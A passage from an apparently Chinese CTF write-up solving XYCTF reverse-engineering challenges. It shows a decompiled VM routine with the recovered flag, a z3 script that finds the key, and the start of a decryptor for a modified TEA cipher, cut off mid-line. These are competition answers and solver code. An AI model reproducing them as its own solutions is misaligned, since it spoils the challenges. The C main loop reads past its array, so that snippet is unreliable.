class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">processCode</span><span class="params">(<span class="type">int</span>* input)</span> &#123;</span><br><span class="line"><span class="type">int</span> code[<span class="number">1802</span>]; <span class="comment">// [rsp+10h] [rbp-1C30h] BYREF</span></span><br><span class="line"><span class="type">int</span> j; <span class="comment">// [rsp+1C38h] [rbp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+1C3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(code, <span class="number">0</span>, <span class="number">0x1C20</span>uLL);</span><br><span class="line">code[<span class="number">32</span>] = <span class="number">2</span>;<span class="comment">//前32使input[0]+32,这一个i，j+1</span></span><br><span class="line">code[<span class="number">65</span>] = <span class="number">2</span>;<span class="comment">//前32使input[1]+32,这一个i，j+1</span></span><br><span class="line">code[<span class="number">66</span>] = <span class="number">4</span>;<span class="comment">//与后一位相加再减70</span></span><br><span class="line">code[<span class="number">98</span>] = <span class="number">2</span>;<span class="comment">//前31个使input[2]+31,这一个i，j+1</span></span><br><span class="line">code[<span class="number">99</span>] = <span class="number">5</span>;<span class="comment">//与后一位相减再加70</span></span><br><span class="line">code[<span class="number">185</span>] = <span class="number">2</span>;<span class="comment">//85个使input[3]+85</span></span><br><span class="line">code[<span class="number">186</span>] = <span class="number">2</span>;<span class="comment">//跳到第5位</span></span><br><span class="line">code[<span class="number">187</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">188</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">189</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">190</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">191</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">192</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">193</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">194</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">195</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">196</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">197</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">198</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">199</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">200</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">201</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">202</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">203</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">204</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">205</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">206</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">207</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">208</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">209</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">210</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">211</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">212</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">213</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">214</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">215</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">216</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">217</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">218</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">219</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">220</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">221</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">222</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">223</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">224</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">225</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">226</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">227</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">228</span>] = <span class="number">1</span>;<span class="comment">//input[5]减42</span></span><br><span class="line">code[<span class="number">229</span>] = <span class="number">2</span>;<span class="comment">//input[6]</span></span><br><span class="line">code[<span class="number">232</span>] = <span class="number">2</span>;<span class="comment">//input[6]+=2,i,j+1</span></span><br><span class="line">code[<span class="number">256</span>] = <span class="number">2</span>;<span class="comment">//input[7]+=23,i,j+1</span></span><br><span class="line">code[<span class="number">257</span>] = <span class="number">5</span>;<span class="comment">//input[8]-后一位+70</span></span><br><span class="line">code[<span class="number">303</span>] = <span class="number">1</span>;<span class="comment">//input[8]+45</span></span><br><span class="line">code[<span class="number">304</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">305</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">306</span>] = <span class="number">1</span>;<span class="comment">//input[8]-4</span></span><br><span class="line">code[<span class="number">307</span>] = <span class="number">2</span>;<span class="comment">//i,j+1</span></span><br><span class="line">code[<span class="number">308</span>] = <span class="number">5</span>;<span class="comment">//input[9]-后一位+70</span></span><br><span class="line">code[<span class="number">328</span>] = <span class="number">1</span>;<span class="comment">//input[9]+19</span></span><br><span class="line">code[<span class="number">329</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">330</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">331</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">332</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">333</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">334</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">335</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">336</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">337</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">338</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">339</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">340</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">341</span>] = <span class="number">1</span>;<span class="comment">//input[9]-14</span></span><br><span class="line">code[<span class="number">342</span>] = <span class="number">2</span>;<span class="comment">//input[10]</span></span><br><span class="line">code[<span class="number">353</span>] = <span class="number">2</span>;<span class="comment">//input[10]+10,input[11]</span></span><br><span class="line">code[<span class="number">354</span>] = <span class="number">5</span>;<span class="comment">//input[11]-后一位+70</span></span><br><span class="line">code[<span class="number">430</span>] = <span class="number">2</span>;<span class="comment">//input[11]+75,input[12]</span></span><br><span class="line">code[<span class="number">431</span>] = <span class="number">2</span>;<span class="comment">//input[13]</span></span><br><span class="line">code[<span class="number">432</span>] = <span class="number">5</span>;<span class="comment">//input[13]-后一位+70</span></span><br><span class="line">code[<span class="number">523</span>] = <span class="number">2</span>;<span class="comment">//input[13]+90,input[14]</span></span><br><span class="line">code[<span class="number">524</span>] = <span class="number">5</span>;<span class="comment">//input[14]-后一位+70</span></span><br><span class="line">code[<span class="number">564</span>] = <span class="number">2</span>;<span class="comment">//input[14]+=39,input[15]</span></span><br><span class="line">code[<span class="number">565</span>] = <span class="number">5</span>;<span class="comment">//input[15]-后一位+70</span></span><br><span class="line">code[<span class="number">627</span>] = <span class="number">2</span>;<span class="comment">//input[15]+=61,input[16]</span></span><br><span class="line">code[<span class="number">628</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">629</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">630</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">631</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">632</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">633</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">634</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">635</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">636</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">637</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">638</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">639</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">640</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">641</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">642</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">643</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">644</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">645</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">646</span>] = <span class="number">1</span>;<span class="comment">//input[16]-=19</span></span><br><span class="line">code[<span class="number">647</span>] = <span class="number">2</span>;<span class="comment">//input[17]</span></span><br><span class="line">code[<span class="number">648</span>] = <span class="number">4</span>;<span class="comment">//input[17]+后一位-70</span></span><br><span class="line">code[<span class="number">649</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">650</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">651</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">652</span>] = <span class="number">1</span>;<span class="comment">//input[17]-4</span></span><br><span class="line">code[<span class="number">653</span>] = <span class="number">2</span>;<span class="comment">//input[18]</span></span><br><span class="line">code[<span class="number">680</span>] = <span class="number">2</span>;<span class="comment">//input[18]+26,input[19]</span></span><br><span class="line">code[<span class="number">687</span>] = <span class="number">2</span>;<span class="comment">//input[19]+6,input[20]</span></span><br><span class="line">code[<span class="number">688</span>] = <span class="number">4</span>;<span class="comment">//input[20]+后一位-70</span></span><br><span class="line">code[<span class="number">698</span>] = <span class="number">2</span>;<span class="comment">//input[20]+9,input[21]</span></span><br><span class="line">code[<span class="number">766</span>] = <span class="number">2</span>;<span class="comment">//input[21]+67,input[22]</span></span><br><span class="line">code[<span class="number">767</span>] = <span class="number">5</span>;<span class="comment">//input[22]-后一位+70</span></span><br><span class="line">code[<span class="number">818</span>] = <span class="number">2</span>;<span class="comment">//input[22]+50,input[23]</span></span><br><span class="line">code[<span class="number">819</span>] = <span class="number">1</span>;<span class="comment">//input[23]-1</span></span><br><span class="line">code[<span class="number">820</span>] = <span class="number">2</span>;<span class="comment">//input[24]</span></span><br><span class="line">code[<span class="number">827</span>] = <span class="number">2</span>;<span class="comment">//input[24]+6,input[25]</span></span><br><span class="line">code[<span class="number">828</span>] = <span class="number">5</span>;<span class="comment">//input[25]-后一位+70</span></span><br><span class="line">code[<span class="number">846</span>] = <span class="number">2</span>;<span class="comment">//input[25]+17,input[26]</span></span><br><span class="line">code[<span class="number">847</span>] = <span class="number">5</span>;<span class="comment">//input[26]-后一位+70</span></span><br><span class="line">code[<span class="number">890</span>] = <span class="number">2</span>;<span class="comment">//input[26]+42,input[27]</span></span><br><span class="line">code[<span class="number">891</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">892</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">893</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">894</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">895</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">896</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">897</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">898</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">899</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">900</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">901</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">902</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">903</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">904</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">905</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">906</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">907</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">908</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">909</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">910</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">911</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">912</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">913</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">914</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">915</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">916</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">917</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">918</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">919</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">920</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">921</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">922</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">923</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">924</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">925</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">926</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">927</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">928</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">929</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">930</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">931</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">932</span>] = <span class="number">1</span>;<span class="comment">//input[27]-42</span></span><br><span class="line">code[<span class="number">933</span>] = <span class="number">2</span>;<span class="comment">//input[28]</span></span><br><span class="line">code[<span class="number">934</span>] = <span class="number">5</span>;<span class="comment">//input[28]-后一位+70</span></span><br><span class="line">code[<span class="number">989</span>] = <span class="number">2</span>;<span class="comment">//input[28]-54,input[29]</span></span><br><span class="line">code[<span class="number">994</span>] = <span class="number">2</span>;<span class="comment">//input[29]+3,input[30]</span></span><br><span class="line">code[<span class="number">995</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">996</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">997</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">998</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">999</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1000</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1001</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1002</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1003</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1013</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1014</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1015</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1016</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1017</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1018</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1019</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1020</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1021</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1022</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1023</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1024</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1025</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1026</span>] = <span class="number">1</span>;<span class="comment">//input[30]-23</span></span><br><span class="line">code[<span class="number">1027</span>] = <span class="number">2</span>;<span class="comment">//input[31]</span></span><br><span class="line">code[<span class="number">1028</span>] = <span class="number">3</span>;</span><br><span class="line">i = <span class="number">31</span>;</span><br><span class="line">j = <span class="number">1027</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt;= <span class="number">-1</span> || i &lt;= <span class="number">-1</span>) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">0</span>) &#123;<span class="comment">//code=0</span></span><br><span class="line">--j;</span><br><span class="line">--input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">1</span>) &#123;</span><br><span class="line">--j;</span><br><span class="line">++input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">2</span>) &#123;<span class="comment">//递增位</span></span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">3</span>)<span class="comment">//结束标志</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">4</span>) &#123;</span><br><span class="line">input[i] = input[i] - input[i + <span class="number">1</span>] + <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (code[j] == <span class="number">5</span>) &#123;</span><br><span class="line">input[i] = input[i] + input[i + <span class="number">1</span>] - <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input[<span class="number">32</span>] = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">125</span> &#125;;</span><br><span class="line">processCode(input);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(input); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, input[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//&quot;FLAG&#123;vm_is_A_3ecreT_l0Ve_revers&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果直接就出了</p><h4 id="舔狗四部曲–相逢已是上上签">舔狗四部曲–相逢已是上上签</h4><p>先用010edtior把指向pe头的偏移修好，改成0001。然后进去用z3把key求出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key,out = zini(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">532</span> * key[<span class="number">5</span>] + <span class="number">829</span> * key[<span class="number">4</span>] + <span class="number">258</span> * key[<span class="number">3</span>] + <span class="number">811</span> * key[<span class="number">2</span>] + <span class="number">997</span> * key[<span class="number">1</span>] + <span class="number">593</span> * key[<span class="number">0</span>] == <span class="number">292512</span>)</span><br><span class="line">s.add(<span class="number">576</span> * key[<span class="number">5</span>] + <span class="number">695</span> * key[<span class="number">4</span>] + <span class="number">602</span> * key[<span class="number">3</span>] + <span class="number">328</span> * key[<span class="number">2</span>] + <span class="number">686</span> * key[<span class="number">1</span>] + <span class="number">605</span> * key[<span class="number">0</span>] == <span class="number">254496</span>)</span><br><span class="line">s.add(<span class="number">580</span> * key[<span class="number">5</span>] + <span class="number">448</span> * key[<span class="number">4</span>] + <span class="number">756</span> * key[<span class="number">3</span>] + <span class="number">449</span> * key[<span class="number">2</span>] + (key[<span class="number">1</span>] &lt;&lt; <span class="number">9</span>) + <span class="number">373</span> * key[<span class="number">0</span>] == <span class="number">222479</span>)</span><br><span class="line">s.add(<span class="number">597</span> * key[<span class="number">5</span>] + <span class="number">855</span> * key[<span class="number">4</span>] + <span class="number">971</span> * key[<span class="number">3</span>] + <span class="number">422</span> * key[<span class="number">2</span>] + <span class="number">635</span> * key[<span class="number">1</span>] + <span class="number">560</span> * key[<span class="number">0</span>] == <span class="number">295184</span>)</span><br><span class="line">s.add(<span class="number">524</span> * key[<span class="number">5</span>] + <span class="number">324</span> * key[<span class="number">4</span>] + <span class="number">925</span> * key[<span class="number">3</span>] + <span class="number">388</span> * key[<span class="number">2</span>] + <span class="number">507</span> * key[<span class="number">1</span>] + <span class="number">717</span> * key[<span class="number">0</span>] == <span class="number">251887</span>)</span><br><span class="line">s.add(<span class="number">414</span> * key[<span class="number">5</span>] + <span class="number">495</span> * key[<span class="number">4</span>] + <span class="number">518</span> * key[<span class="number">3</span>] + <span class="number">884</span> * key[<span class="number">2</span>] + <span class="number">368</span> * key[<span class="number">1</span>] + <span class="number">312</span> * key[<span class="number">0</span>] == <span class="number">211260</span>)</span><br><span class="line"></span><br><span class="line">zcheck(s,key)</span><br><span class="line"><span class="comment"># XYCTF!</span></span><br></pre></td></tr></table></figure><p>然后后面是一个魔改tea，直接解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec2</span><span class="params">(DWORD* flag, <span class="type">int</span> len_after)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> mid; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"><span class="type">int</span> round; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag_last; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_after &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">round = <span class="number">52</span> / len_after + <span class="number">6</span>;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">sum -= round * <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = len_after - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] -= ((flag[(i + <span class="number">7</span>) % <span class="number">8</span>] ^ key[(((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">5</span>) ^ i) &amp; <span class="number">5</span>]) + (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] ^ sum)) ^ (((<span class="number">16</span> * flag[(i + <span class="number">7</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * flag[(i + <span class="number">1</span>) % <span class="number">8</span>]) ^ (flag[(i + 